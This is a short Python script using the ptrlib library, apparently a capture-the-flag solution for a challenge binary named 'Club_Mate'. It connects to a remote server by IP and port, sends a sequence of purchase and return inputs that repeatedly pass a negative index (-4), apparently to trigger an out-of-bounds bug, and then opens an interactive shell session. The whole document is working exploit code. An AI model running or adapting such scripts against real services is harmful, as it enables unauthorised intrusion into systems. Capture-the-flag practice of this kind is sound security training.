from ptrlib import *

def buy(index):
    sock.sendline(str(index))
    sock.sendline("$4")
def ret(index):
    sock.sendline(str(index))
    sock.sendline("yes")

elf = ELF("./Club_Mate")
#sock = Process(["stdbuf", "-o0", "-i0", "./Club_Mate"])
sock = Socket("13.48.178.241", 50000)

buy(0)
ret(0)
for i in range(1, 15):
    buy(i)
for i in range(113):
    buy(-4)
buy(0)

sock.interactive()
